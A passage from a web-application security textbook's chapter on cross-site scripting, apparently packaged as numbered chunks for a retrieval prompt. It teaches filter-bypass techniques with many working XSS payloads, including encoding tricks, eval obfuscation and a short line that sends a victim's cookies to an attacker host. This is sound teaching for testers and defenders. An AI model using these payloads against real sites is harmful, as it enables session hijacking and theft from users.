Often, when you are trying to fi ne-tune an attack in an unusual situation, it\ncan be helpful to view the virtual HTML that the browser constructs out of the\nserver’s actual response. In Firefox, you can use the WebDeveloper tool, which\ncontains a View Generated Source function that performs precisely this task. Character Sets\nIn some situations, you can employ a powerful means of bypassing many types\nof fi lters by causing the application to accept a nonstandard encoding of your\nattack payload. The following examples show some representations of the string\n<script>alert(document.cookie)</script> in alternative character sets:"
  },
  {
    "index": 17,
    "text": "UTF-7\n+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-\n\nUS-ASCII\nBC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do\n63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/\n73 63 72 69 70 74 BE ; script¾"
  },
  {
    "index": 18,
    "text": "UTF-16\nFF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t. 3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d. 6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t... 63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<. 2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>. These encoded strings will bypass many common anti-XSS fi lters. The challenge\nof delivering a successful attack is to make the browser interpret the response\nusing the character set required. If you control either the HTTP Content-Type\nheader or its corresponding HTML metatag, you may be able to use a nonstan-\ndard character set to bypass the application’s fi lters and cause the browser to\ninterpret your payload in the way you require. In some applications, a charset\nparameter is actually submitted in certain requests, enabling you to directly\nset the character set used in the application’s response. If the application by default uses a multibyte character set, such as Shift-JIS,\nthis may enable you to bypass certain input fi lters by submitting characters that\nhave special signifi cance in the character set being used. For example, suppose\ntwo pieces of user input are returned in the application’s response:\n<img src=”image.gif” alt=”[input1]” /> ... [input2]\ncc1122..iinndddd 446644 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 465\nChapter 12 n Attacking Users: Cross-Site Scripting 465\nFor input1, the application blocks input containing quotation marks to prevent\nan attacker from terminating the quoted attribute. For input2, the application\nblocks input containing angle brackets to prevent an attacker from using any\nHTML tags. This appears to be robust, but an attacker may be able to deliver\nan exploit using the following two inputs:\ninput1: [%f0]\ninput2: “onload=alert(1);\nIn the Shift-JIS character set, various raw byte values, including 0xf0, are used\nto signal a 2-byte character that is composed of that byte and the following byte. Hence, when the browser processes input1, the quotation mark following the\n0xf0 byte is interpreted as part of a 2-byte character and therefore does not delimit\nthe attribute value. The HTML parser continues until it reaches the quotation\nmark supplied in input2, which terminates the attribute, allowing the attacker’s\nsupplied event handler to be interpreted as an additional tag attribute:\n<img src=”image.gif” alt=”? /> ... “onload=alert(1);\nWhen exploits of this kind were identifi ed in the widely used multibyte\ncharacter set UTF-8, browser vendors responded with a fi x that prevented the\nattack from succeeding. However, currently the same attack still works on some\nbrowsers against several other lesser-used multibyte character sets, including\nShift-JIS, EUC-JP, and BIG5. Bypassing Filters: Script Code\nIn some situations, you will fi nd a way to manipulate refl ected input to introduce\na script context into the application’s response. However, various other obstacles\nmay prevent you from executing the code you need to deliver an actual attack. The kind of fi lters you may encounter here typically seek to block the use of\ncertain JavaScript keywords and other expressions. They may also block useful\ncharacters such as quotes, brackets, and dots. As with the obfuscation of attacks using HTML, you can use numerous\ntechniques to modify your desired script code to bypass common input fi lters. Using JavaScript Escaping\nJavaScript allows various kinds of character escaping, which you can use to\navoid including required expressions in their literal form. Unicode escapes can be used to represent characters within JavaScript key-\nwords, allowing you to bypass many kinds of fi lters:\n<script>a\\u006cert(1);</script>\nIf you can make use of the eval command, possibly by using the preceding\ntechnique to escape some of its characters, you can execute other commands\nby passing them to the eval command in string form. This allows you to\ncc1122..iinndddd 446655 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 466\n466 Chapter 12 n Attacking Users: Cross-Site Scripting\nuse various string manipulation techniques to hide the command you are\nexecuting. Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes,\nand octal escapes:\n<script>eval(‘a\\u006cert(1)’);</script>\n<script>eval(‘a\\x6cert(1)’);</script>\n<script>eval(‘a\\154ert(1)’);</script>\nFurthermore, superfl uous escape characters within strings are ignored:\n<script>eval(‘a\\l\\ert\\(1\\)’);</script>\nDynamically Constructing Strings\nYou can use other techniques to dynamically construct strings to use in your attacks:\n<script>eval(‘al’+’ert(1)’);</script>\n<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>\n<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>\nThe fi nal example, which works on Firefox, allows you to decode a Base64-\nencoded command before passing it to eval. Alternatives to eval\nIf direct calls to the eval command are not possible, you have other ways to\nexecute commands in string form:\n<script>’alert(1)’.replace(/.+/,eval)</script>\n<script>function::[‘alert’](1)</script>\nAlternatives to Dots\nIf the dot character is being blocked, you can use other methods to perform\ndereferences:\n<script>alert(document[‘cookie’])</script>\n<script>with(document)alert(cookie)</script>\nCombining Multiple Techniques\nThe techniques described so far can often be used in combination to apply sev-\neral layers of obfuscation to your attack. Furthermore, in cases where JavaScript\nis being used within an HTML tag attribute (via an event handler, scripting\npseudo-protocol, or dynamically evaluated style), you can combine these tech-\nniques with HTML encoding. The browser HTML-decodes the tag attribute\nvalue before the JavaScript it contains is interpreted. In the following example,\nthe “e” character in “alert” has been escaped using Unicode escaping, and the\nbackslash used in the Unicode escape has been HTML-encoded:\n<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>\ncc1122..iinndddd 446666 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 467\nChapter 12 n Attacking Users: Cross-Site Scripting 467\nOf course, any of the other characters within the onerror attribute value could\nalso be HTML-encoded to further hide the attack:\n<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&\n#x29;&#x27;&#x29; src=a>\nThis technique enables you to bypass many fi lters on JavaScript code, because\nyou can avoid using any JavaScript keywords or other syntax such as quotes,\nperiods, and brackets. Using VBScript\nAlthough common examples of XSS exploits typically focus on JavaScript, on\nInternet Explorer you also can use the VBScript language. It has different syntax\nand other properties that you may be able to leverage to bypass many input\nfi lters that were designed with only JavaScript in mind. You can introduce VBScript code in various ways:\n<script language=vbs>MsgBox 1</script>\n<img onerror=”vbs:MsgBox 1” src=a>\n<img onerror=MsgBox+1 language=vbs src=a>\nIn all cases, you can use vbscript instead of vbs to specify the language. In\nthe last example, note the use of MsgBox+1 to avoid the use of whitespace, thereby\navoiding the need for quotes around the attribute value. This works because\n+1 effectively adds the number 1 to nothing, so the expression evaluates to 1,\nwhich is passed to the MsgBox function. It is noteworthy that in VBScript, some functions can be called without brack-\nets, as shown in the preceding examples. This may allow you to bypass some\nfi lters that assume that script code must employ brackets to access any functions. Furthermore, unlike JavaScript, the VBScript language is not case-sensitive,\nso you can use upper and lowercase characters in all keywords and function\nnames. This behavior is most useful when the application function you are\nattacking modifi es the case of your input, such as by converting it to uppercase. Although this may have been done for reasons of functionality rather than secu-\nrity, it may frustrate XSS exploits using JavaScript code, which fails to execute\nwhen converted to uppercase. In contrast, exploits using VBScript still work:\n<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>\n<IMG ONERROR=”VBS:MSGBOX 1” SRC=A>\nCombining VBScript and JavaScript\nTo add further layers of complexity to your attack, and circumvent some fi lters,\nyou can call into VBScript from JavaScript, and vice versa:\n<script>execScript(“MsgBox 1”,”vbscript”);</script>\n<script language=vbs>execScript(“alert(1)”)</script>\ncc1122..iinndddd 446677 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 468\n468 Chapter 12 n Attacking Users: Cross-Site Scripting\nYou can even nest these calls and ping-pong between the languages as required:\n<script>execScript(‘execScript\n“alert(1)”,”javascript”’,”vbscript”);</script>\nAs mentioned, VBScript is case-insensitive, allowing you to execute code in\ncontexts where your input is converted to uppercase. If you really want to call\nJavaScript functions in these situations, you can use string manipulation func-\ntions within VBScript to construct a command with the required case and then\nexecute this using JavaScript:\n<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>\n<IMG ONERROR=”VBS:EXECSCRIPT LCASE(‘ALERT(1)’)” SRC=A>\nUsing Encoded Scripts\nOn Internet Explorer, you can use Microsoft’s custom script-encoding algorithm\nto hide the contents of scripts and potentially bypass some input fi lters:\n<img onerror=”VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@” src=a>\n<img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@”\nsrc=a>\nThis encoding was originally designed to prevent users from inspecting\nclient-side scripts easily by viewing the source code for the HTML page. It has\nsince been reverse-engineered, and numerous tools and websites will let you\ndecode encoded scripts. You can encode your own scripts for use in attacks via\nMicrosoft’s command-line utility srcenc in older versions of Windows. Beating Sanitization\nOf all the obstacles that you may encounter when attempting to exploit poten-\ntial XSS conditions, sanitizing fi lters are probably the most common. Here, the\napplication performs some kind of sanitization or encoding on your attack string\nthat renders it harmless, preventing it from causing the execution of JavaScript. The most prevalent manifestation of data sanitization occurs when the appli-\ncation HTML-encodes certain key characters that are necessary to deliver an\nattack (so < becomes &lt; and > becomes &gt;)."
  },
  {
    "index": 19,
    "text": "In other cases, the application\nmay remove certain characters or expressions in an attempt to cleanse your\ninput of malicious content. When you encounter this defense, your fi rst step is to determine precisely\nwhich characters and expressions are being sanitized, and whether it is still\npossible to carry out an attack without directly employing these characters\nand expressions. For example, if your data is being inserted directly into an\nexisting script, you may not need to employ any HTML tag characters. Or, if\nthe application is removing <script> tags from your input, you may be able\ncc1122..iinndddd 446688 88//1199//22001111 1122::1122::3300 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 469\nChapter 12 n Attacking Users: Cross-Site Scripting 469\nto use a different tag with a suitable event handler. Here, you should consider\nall the techniques already discussed for dealing with signature-based fi lters,\nincluding using layers of encoding, NULL bytes, nonstandard syntax, and\nobfuscated script code. By modifying your input in the various ways described,\nyou may be able to devise an attack that does not contain any of the characters\nor expressions that the fi lter is sanitizing and therefore successfully bypass it. If it appears impossible to perform an attack without using input that is being\nsanitized, you need to test the effectiveness of the sanitizing fi lter to establish\nwhether any bypasses exist. As described in Chapter 2, several mistakes often appear in sanitizing fi lters. Some string manipulation APIs contain methods to replace only the fi rst instance\nof a matched expression, and these are sometimes easily confused with methods\nthat replace all instances. So if <script> is being stripped from your input, you\nshould try the following to check whether all instances are being removed:\n<script><script>alert(1)</script>\nIn this situation, you should also check whether the sanitization is being\nperformed recursively:\n<scr<script>ipt>alert(1)</script>\nFurthermore, if the fi lter performs several sanitizing steps on your input, you\nshould check whether the order or interplay between these can be exploited. For example, if the fi lter strips <script> recursively and then strips <object>\nrecursively, the following attack may succeed:\n<scr<object>ipt>alert(1)</script>\nWhen you are injecting into a quoted string in an existing script, it is com-\nmon to fi nd that the application sanitizes your input by placing the backslash\ncharacter before any quotation mark characters you submit. This escapes your\nquotation marks, preventing you from terminating the string and injecting\narbitrary script. In this situation, you should always verify whether the back-\nslash character itself is being escaped. If not, a simple fi lter bypass is possible. For example, if you control the value foo in:\nvar a = ‘foo’;\nyou can inject:\nfoo\\’; alert(1);//\nThis results in the following response, in which your injected script exe-\ncutes. Note the use of the JavaScript comment character // to comment out the\ncc1122..iinndddd 446699 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 470\n470 Chapter 12 n Attacking Users: Cross-Site Scripting\nremainder of the line, thus preventing a syntax error caused by the application’s\nown string delimiter:\nvar a = ‘foo\\\\’; alert(1);//’;\nHere, if you fi nd that the backslash character is also being properly escaped,\nbut angle brackets are returned unsanitized, you can use the following attack:\n</script><script>alert(1)</script>\nThis effectively abandons the application’s original script and injects a new\none immediately after it. The attack works because browsers’ parsing of HTML\ntags takes precedence over their parsing of embedded JavaScript:\n<script>var a = ‘</script><script>alert(1)</script>\nAlthough the original script now contains a syntax error, this does not matter,\nbecause the browser moves on and executes your injected script regardless of\nthe error in the original script. TRY IT! http://mdsec.net/search/48/\nhttp://mdsec.net/search/52/\nTIP If you can inject into a script, but you cannot use quotation marks because\nthese are being escaped, you can use the String.fromCharCode technique to\nconstruct strings without the need for delimiters, as described previously. In cases where the script you are injecting into resides within an event handler,\nrather than a full script block, you may be able to HTML-encode your quotation\nmarks to bypass the application’s sanitization and break out of the string you\ncontrol. For example, if you control the value foo in:\n<a href=”#” onclick=”var a = ‘foo’; ... and the application is properly escaping both quotation marks and backslashes\nin your input, the following attack may succeed:\nfoo&apos;; alert(1);//\nThis results in the following response, and because some browsers perform\nan HTML decode before the event handler is executed as JavaScript, the attack\nsucceeds:\n<a href=”#” onclick=”var a = ‘foo&apos;; alert(1);//’; ... cc1122..iinndddd 447700 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 471\nChapter 12 n Attacking Users: Cross-Site Scripting 471\nThe fact that event handlers are HTML-decoded before being executed as\nJavaScript represents an important caveat to the standard recommendation\nof HTML-encoding user input to prevent XSS attacks. In this syntactic context,\nHTML encoding is not necessarily an obstacle to an attack. The attacker himself\nmay even use it to circumvent other defenses. Beating Length Limits\nWhen the application truncates your input to a fi xed maximum length, you\nhave three possible approaches to creating a working exploit. The fi rst, rather obvious method is to attempt to shorten your attack payload\nby using JavaScript APIs with the shortest possible length and removing char-\nacters that are usually included but are strictly unnecessary. For example, if you\nare injecting into an existing script, the following 28-byte command transmits\nthe user’s cookies to the server with hostname a:\nopen(“//a/”+document.cookie)\nAlternatively, if you are injecting straight into HTML, the following 30-byte\ntag loads and executes a script from the server with hostname a:\n<script src=http://a></script>\nOn the Internet, these examples would obviously need to be expanded to\ncontain a valid domain name or IP address. However, on an internal corporate\nnetwork, it may actually be possible to use a machine with the WINS name a\nto host the recipient server. TIP You can use Dean Edwards’ JavaScript packer to shrink a given script as\nmuch as possible by eliminating unnecessary whitespace. This utility also con-\nverts scripts to a single line for easy insertion into a request parameter:\nhttp://dean.edwards.name/packer/\nThe second, potentially more powerful technique for beating length limits\nis to span an attack payload across multiple different locations where user-\ncontrollable input is inserted into the same returned page. For example, consider\nthe following URL:\nhttps://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal\nIt returns a page containing the following:\n<input type=”hidden” name=”page_id” value=”244”>\n<input type=”hidden” name=”seed” value=”129402931”>\n<input type=”hidden” name=”mode” value=”normal”>\ncc1122..iinndddd 447711 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 472\n472 Chapter 12 n Attacking Users: Cross-Site Scripting\nSuppose that each fi eld has length restrictions, such that no feasible attack\nstring can be inserted into any of them. Nevertheless, you can still deliver a\nworking exploit by using the following URL to span a script across the three\nlocations you control:\nhttps://myapp.com/account.php?page_id=”><script>/*&seed=*/alert(document\n.cookie);/*&mode=*/</script>\nWhen the parameter values from this URL are embedded into the page, the\nresult is the following:\n<input type=”hidden” name=”page_id” value=””><script>/*”>\n<input type=”hidden” name=”seed” value=”*/alert(document.cookie);/*”>\n<input type=”hidden” name=”mode” value=”*/</script>”>\nThe resulting HTML is valid and is equivalent to only the portions in bold. The chunks of source code in between have effectively become JavaScript com-\nments (surrounded by the /* and */ markers), so the browser ignores them. Hence, your script is executed just as if it had been inserted whole at one loca-\ntion within the page. TIP The technique of spanning an attack payload across multiple fi elds can\nsometimes be used to beat other types of defensive fi lters. It is fairly common\nto fi nd different data validation and sanitization being implemented on differ-\nent fi elds within a single page of an application. In the previous example, sup-\npose that the page_id and mode parameters are subject to a maximum length\nof 12 characters. Because these fi elds are so short, the application’s developers\ndid not bother to implement any XSS fi lters. The seed parameter, on the other\nhand, is unrestricted in length, so rigorous fi lters were implemented to prevent\nthe injection of the characters “< or >. In this scenario, despite the developers’\nefforts, it is still possible to insert an arbitrarily long script into the seed param-\neter without employing any of the blocked characters, because the JavaScript\ncontext can be created by data injected into the surrounding fi elds. A third technique for beating length limits, which can be highly effective\nin some situations, is to “convert” a refl ected XSS fl aw into a DOM-based\nvulnerability. For example, in the original refl ected XSS vulnerability, if the\napplication places a length restriction on the message parameter that is cop-\nied into the returned page, you can inject the following 45-byte script, which\nevaluates the fragment string in the current URL:\n<script>eval(location.hash.slice(1))</script>\nBy injecting this script into the parameter that is vulnerable to refl ected XSS,\nyou can effectively induce a DOM-based XSS vulnerability in the resulting page\ncc1122..iinndddd 447722 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 473\nChapter 12 n Attacking Users: Cross-Site Scripting 473\nand thus execute a second script located within the fragment string, which is\noutside the control of the application’s fi lters and may be arbitrarily long. For\nexample:\nhttp://mdsec.net/error/5/Error.ashx?message=<script>eval(location.hash\n.substr(1))</script>#alert(‘long script here ......’)\nHere is an even shorter version that works in most situations:\nhttp://mdsec.net/error/5/Error.ashx?message=<script>eval(unescape(location))\n</script>#%0Aalert(‘long script here ......’)\nIn this version, the whole of the URL is URL-decoded and then passed to the\neval command. The whole URL executes as valid JavaScript because the http:\nprotocol prefi x serves as a code label, the // following the protocol prefi x serves\nas a single-line comment, and the %0A is URL-decoded to become a newline,\nsignaling the end of the comment. Delivering Working XSS Exploits\nTypically, when you are working on a potential XSS vulnerability to understand\nand bypass the application’s fi lters, you are working outside the browser, using\na tool such as Burp Repeater to send the same request repeatedly, modifying\nthe request in small ways each time, and testing the effect on the response. In\nsome situations, after you have created a proof-of-concept attack in this way,\nyou still may have work to do in order to deliver a practical attack against other\napplication users. For example, the entry point for the XSS may be nontrivial to\ncontrol in other users’ requests, such as a cookie or the Referer header. Or the\ntarget users may be using a browser with built-in protection against refl ected\nXSS attacks. This section examines various challenges that may arise when\ndelivering working XSS exploits in practice and how they can be circumvented. Escalating an Attack to Other Application Pages\nSuppose the vulnerability you have identifi ed is in an uninteresting area of the\napplication, affecting only unauthenticated users, and a different area contains\nthe really sensitive data and functionality you want to compromise."
  },
  {
    "index": 20,
    "text": "In this situation, it is normally fairly easy to devise an attack payload that\nyou can deliver via the XSS bug in one area of the application and that persists\nwithin the user’s browser to compromise the victim anywhere he goes on the\nsame domain. One simple method of doing this is for the exploit to create an iframe cover-\ning the whole browser window and reload the current page within the iframe. As the user navigates through the site and logs in to the authenticated area,\nthe injected script keeps running in the top-level window. It can hook into all\ncc1122..iinndddd 447733 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 474\n474 Chapter 12 n Attacking Users: Cross-Site Scripting\nnavigation events and form submissions in the child iframe, monitor all response\ncontent appearing in the iframe, and, of course, hijack the user’s session when\nthe moment is right. In HTML5-capable browsers, the script can even set the\nappropriate URL in the location bar as the user moves between pages, using\nthe window.history.pushState() function. For one example of this kind of exploit, see this URL:\nhttp://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html"
  },
  {
    "index": 21,
    "text": "COMMON MYTH\n“We’re not worried about any XSS bugs in the unauthenticated part of our\nsite. They can’t be used to hijack sessions.”\nThis thought is erroneous for two reasons. First, an XSS bug in the unau-\nthenticated part of an application normally can be used to directly compro-\nmise the sessions of authenticated users. Hence, an unauthenticated refl ected\nXSS fl aw typically is more serious than an authenticated one, because the\nscope of potential victims is wider. Second, even if a user is not yet authen-\nticated, an attacker can deploy some Trojan functionality that persists in the\nvictim’s browser across multiple requests, waiting until the victim logs in, and\nthen hijacking the resulting session. It is even possible to capture a user’s\npassword using a keylogger written in JavaScript, as described in Chapter 13.\nModifying the Request Method\nSuppose that the XSS vulnerability you have identifi ed uses a POST request, but the\nmost convenient method for delivering an attack requires the GET method — for\nexample, by submitting a forum post containing an IMG tag targeting the vul-\nnerable URL.\nIn these cases, it is always worth verifying whether the application handles\nthe request in the same way if it is converted to a GET request. Many applications\ntolerate requests in either form.\nIn Burp Suite, you can use the “change request method” command on the\ncontext menu to toggle any request between the GET and POST methods."
  }
]
[END_CHUNKS]
Reply with the index only: